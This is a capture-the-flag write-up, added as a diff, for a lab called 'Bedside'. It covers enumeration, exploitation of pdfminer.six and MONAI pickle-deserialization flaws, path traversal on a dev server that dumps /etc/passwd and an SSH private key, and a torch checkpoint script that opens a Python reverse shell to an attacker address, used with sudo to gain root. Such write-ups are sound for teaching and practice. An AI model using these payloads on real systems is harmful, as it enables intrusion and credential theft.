@@ -1,0 +1,119 @@
+# Profile
+- Lab: Bedside
+- ip: 10.129.41.191
+- Category: Linux
+
+# Enumeration
+nmap -sC -sV -Pn -PE --disable-arp-ping -oN nmap_bed 10.129.41.191
+22 ssh, 80 http,
+3000 filtered ppp
+
+I discover the web page, the web vhost research ( research.bedsite.htb ) and add it to /etc/hosts.
+The upload functionnality reveals the tech used in the headers pdfminer.six
+`X-Powered-By: pdfminer.six`
+Which could be exploited as CVE-2025-64512
+## As datawrangler
+Inspecting the pdf_watcher.py, we found out /datastore/staging as output_dir, we will look into it.
+I found /tmp/portscan.sh which shows us port 3000 which is open, we curl -v http://127.0.0.1:3000/ and it renders a webpage, we chisel it on our localhost:3000 to see it well ( to inspect it ).
+found out it has hmr at /@hmr and websocket /@hmr-ws. The idea could be to find out a way to use it well to get interesting stuff.
+## As developer
+sudo -l shows we have pass to /opt/trainer/bedside_trainer.py
+We read the code and seems it is MONAI v0.10 or in fact which seems to be vulnerable as indicated in CVE-2025-58756
+
+# Exploitation
+To exploit it,I upload a "malicious payload11.pickle.gz " following the CVE poc, I put the whole path of the malicious pickle "#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#payload11.pickle.gz" in the "malicious.pdf" that I also uploaded. Then I go at research.bedside.htb/uploads/malicious.pdf that I refresh until it works. HUH!
+## As datawrangler
+After chisel the service at 3000, we just use path traversal( /../../../../../../../../../etc/passwd ) to read the data ( sensitive files from the dev server as this /etc/passwd which is different from the docker one ensuring us we really got access to the dev server sensitive files ) easily like that ! Ahahah !
+```Burpsuite
+HTTP/1.1 200 OK
+Cache-Control: max-age=0, must-revalidate
+Content-Type: application/octet-stream
+Etag: w/"1780110289405-1328-136"
+Date: Mon, 20 Jul 2026 13:36:34 GMT
+Content-Length: 1328
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
+sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
+developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+datawrangler:x:988:1001::/home/datawrangler:/bin/sh
+_laurel:x:987:987::/var/log/laurel:/bin/false
+polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
+```
+With this we know there is a user developer, and we know ssh is used here ( sshd, even 22 port open ), we try to get the private key which might be at /home/developer/.ssh/id_rsa (still using path traversal ofcourse), and we get a result which is:
+```Burpsuite
+HTTP/1.1 200 OK
+Cache-Control: max-age=0, must-revalidate
+Content-Type: application/octet-stream
+Etag: w/"1762737401212-411-136"
+Date: Mon, 20 Jul 2026 13:43:35 GMT
+Content-Length: 411
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
+SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
+AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
+RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+```
+Using this private key, we ssh in. Yeah got the user.txt *-* !
+
+## As developer
+we build malicious_checkpoint.pt and put in the /datastore/checkpoints and also put an image ( png for example ) at the /datastore/processed for it to launch our pt.
+```mkckpt.py
+import os   
+import json  
+import torch  
+from pathlib import Path  
+  
+class MaliciousPayload:  
+    def __reduce__(self):  
+        return (os.system, ('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\' &',))  
+  
+def test_checkpoint_loader_attack():  
+
+      
+
+    temp_dir = Path("/datastore/checkpoints")  
+    checkpoint_file = temp_dir / "malicious_checkpoint.pt"  
+      
+
+    malicious_checkpoint = {  
+        'model_state_dict': MaliciousPayload(),  
+        'optimizer_state_dict': {},  
+        'epoch': 50  
+    }  
+      
+
+    torch.save(malicious_checkpoint, checkpoint_file) 
+
+test_checkpoint_loader_attack()
+```
+We also rm all the /datastore/*/*.txt which induces some errors.
+
+And then we sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py and we got our root shell.
+And of course the root.txt *-* !
+
+# Links
+https://github.com/advisories/GHSA-wf5f-4jwr-ppcp
+https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj
